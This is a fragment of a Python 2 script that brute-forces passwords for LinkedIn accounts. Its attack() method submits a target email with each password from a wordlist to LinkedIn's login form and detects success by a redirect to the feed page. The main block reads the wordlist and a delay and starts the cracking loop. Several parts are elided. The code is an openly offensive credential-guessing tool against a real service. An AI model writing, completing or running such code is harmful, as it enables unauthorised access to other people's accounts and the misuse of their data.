...
class LinkedIn:
    ...
    def attack(self, password):
        try:
            ...
            br.select_form(nr=0)
            br.form['session_key'] = self.mail
            br.form['session_password'] = password
            br.submit()
            log = br.geturl()
            if (log != self.url) and ('/feed' in log):
            #if (log != self.url) and (not 'home?goback=' in log) and (not 'login-submit' in log):
                print log
                sys.stdout.write("\r")
                sys.stdout.flush()
...
if __name__ == "__main__":
    ...
    wordlist = sys.argv[2]
    delay = sys.argv[3]
    f = LinkedIn(mail, wordlist, delay)
    f.banner()
    f.crack()
